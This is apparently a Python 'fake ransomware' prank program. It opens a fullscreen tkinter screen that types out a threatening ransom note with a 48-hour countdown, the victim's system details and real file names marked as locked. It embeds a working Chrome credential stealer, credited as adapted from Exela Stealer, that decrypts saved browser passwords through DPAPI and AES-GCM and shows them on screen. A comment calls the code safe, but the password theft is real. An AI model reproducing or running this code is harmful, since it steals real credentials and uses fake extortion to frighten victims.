import tkinter as tk
import os
import getpass
import platform
import socket
import uuid
import subprocess
import time
import threading
import random
import sqlite3
import win32crypt
import json
from base64 import b64decode
from Crypto.Cipher import AES

class FakeRansomwareCLI:
    def __init__(self, root):
        self.root = root
        self.root.title("Ransomware")
        self.root.configure(bg="black")
        self.root.attributes("-fullscreen", True)
        self.root.bind("<space>", self.exit_program)

        # Countdown time (48 hours in seconds)
        self.time_left = 48 * 60 * 60

        # Text widget (main terminal area)
        self.text_widget = tk.Text(
            root,
            bg="black",
            fg="red",
            insertbackground="red",
            font=("Consolas", 13),
            bd=0,
            highlightthickness=0,
            padx=20,
            pady=20
        )
        self.text_widget.pack(side="left", fill="both", expand=True)
        self.text_widget.configure(state="disabled")

        # Timer (top right)
        self.timer_label = tk.Label(
            root,
            text="",
            fg="red",
            bg="black",
            font=("Consolas", 28, "bold"),
            anchor="ne",
            justify="right"
        )
        self.timer_label.place(relx=0.99, rely=0.01, anchor="ne")

        # SYSTEM INFO (SAFE: purely local, nothing sent)
        username = getpass.getuser()
        computername = platform.node()
        ip_address = socket.gethostbyname(socket.gethostname())
        os_info = f"{platform.system()} {platform.release()}"

        try:
            mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                                for ele in range(0, 8*6, 8)][::-1])
        except:
            mac_addr = "Unavailable"

        try:
            hwid = subprocess.check_output("wmic csproduct get uuid", shell=True).decode().split('\n')[1].strip()
        except:
            hwid = "Unavailable"

        # Chrome password stealer (adapted from Exela Stealer)
        def get_chrome_passwords():
            try:
                passwords = []
                login_db = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
                if not os.path.exists(login_db):
                    return ["[ERROR] Chrome password database not found"]

                # Copy database to avoid locking
                temp_path = os.path.join(os.environ["TEMP"], f"Login Data")
                with open(login_db, 'rb') as f:
                    data = f.read()
                with open(temp_path, 'wb') as f:
                    f.write(data)

                # Get encryption key
                local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = json.load(f)
                key = b64decode(local_state["os_crypt"]["encrypted_key"])
                key = key[5:]  # Remove 'DPAPI' prefix
                key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

                # Connect to database and query passwords
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, username, password in cursor.fetchall():
                    if not username or not password:
                        continue
                    # Decrypt password
                    try:
                        iv = password[3:15]
                        encrypted_password = password[15:-16]
                        tag = password[-16:]
                        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                        decrypted_password = cipher.decrypt_and_verify(encrypted_password, tag).decode("utf-8")
                        passwords.append(f"[LEAKED] {url} : {username} : {decrypted_password}")
                    except:
                        continue
                conn.close()
                os.remove(temp_path)  # Clean up
                return passwords[:5] if passwords else ["[ERROR] No passwords found"]
            except Exception as e:
                return [f"[ERROR] Failed to extract passwords: {str(e)}"]

        chrome_passwords = get_chrome_passwords()

        # Fake sensitive info (other than passwords)
        fake_sensitive = [
            f"[LEAKED] SSN Fragment: ***-**-{random.randint(1000,9999)}",
            f"[LEAKED] Crypto Wallet: 0x{random.randint(100000,999999)}...{random.randint(1000,9999)}",
            f"[LEAKED] Recent Browser Search: 'secure my account' ({time.strftime('%Y-%m-%d %H:%M:%S')})",
        ]

        # Fake filenames with "encrypted" extensions
        user_dir = os.path.expanduser("~")
        sample_files = []
        for folder in ["Desktop", "Documents", "Downloads", "Pictures", "Videos"]:
            path = os.path.join(user_dir, folder)
            if os.path.isdir(path):
                try:
                    files = os.listdir(path)
                    files = [f for f in files if os.path.isfile(os.path.join(path, f))]
                    sample_files += random.sample(files, min(3, len(files)))
                except:
                    continue
        if not sample_files:
            sample_files = ["tax_return_2023.pdf", "passport_scan.jpg", "private_notes.txt"]
        sample_files = [f"{f}.locked" for f in sample_files]

        # Typing script with Chrome passwords
        self.lines_to_type = [
            "[!] CRITICAL SYSTEM BREACH DETECTED\n",
            "[*] Establishing remote connection...\n",
            "[*] Bypassing firewall defenses\n",
            "[*] Accessing Chrome password database\n",
            "[*] Decrypting credentials with DPAPI key\n",
            "[*] Deploying encryption payload v3.7.1\n",
            "[*] Uploading data to dark web server...\n",
            "\n",
            f"[INFO] Username: {username}\n",
            f"[INFO] Computer Name: {computername}\n",
            f"[INFO] IP Address: {ip_address}\n",
            f"[INFO] OS Version: {os_info}\n",
            f"[INFO] MAC Address: {mac_addr}\n",
            f"[INFO] HWID: {hwid}\n",
            "\n",
            "[!!!] YOUR SYSTEM IS COMPROMISED\n",
            "All files have been encrypted. Do NOT shut down or data will be wiped.\n",
            "Webcam and microphone activated. Remote monitoring enabled.\n",
            "\n",
            "Compromised files detected:\n"
        ] + [f"  - {f}" for f in sample_files] + [
            "\n",
            "Extracted Chrome credentials:\n"
        ] + chrome_passwords + [
            "\n",
            "Additional stolen data:\n"
        ] + fake_sensitive + [
            "\n",
            "To recover your files, send 0.5 BTC to: 1X{random.randint(100000,999999)}...{random.randint(1000,9999)}\n",
            "Instructions at: http://decryptdata.onion/restore?id=AC7DFF91\n",
            "\n",
            "Unique ID: AC7DFF91\n",
            "Time left until data leak:\n",
        ]

        self.current_line = 0
        self.current_char = 0
        self.typing_speed_ms = 18
        self.start_typing()

        threading.Thread(target=self.update_timer, daemon=True).start()

    def start_typing(self):
        if self.current_line < len(self.lines_to_type):
            line = self.lines_to_type[self.current_line]
            if self.current_char < len(line):
                self.append_text(line[self.current_char])
                self.current_char += 1
                self.root.after(self.typing_speed_ms, self.start_typing)
            else:
                self.current_line += 1
                self.current_char = 0
                self.root.after(250, self.start_typing)

    def append_text(self, char):
        self.text_widget.configure(state="normal")
        self.text_widget.insert("end", char)
        self.text_widget.see("end")
        self.text_widget.configure(state="disabled")

    def update_timer(self):
        while self.time_left >= 0:
            hrs = self.time_left // 3600
            mins = (self.time_left % 3600) // 60
            secs = self.time_left % 60
            timer_str = f"{hrs:02}:{mins:02}:{secs:02}"
            self.timer_label.config(text=timer_str)
            time.sleep(1)
            self.time_left -= 1

    def exit_program(self, event):
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = FakeRansomwareCLI(root)
    root.mainloop()
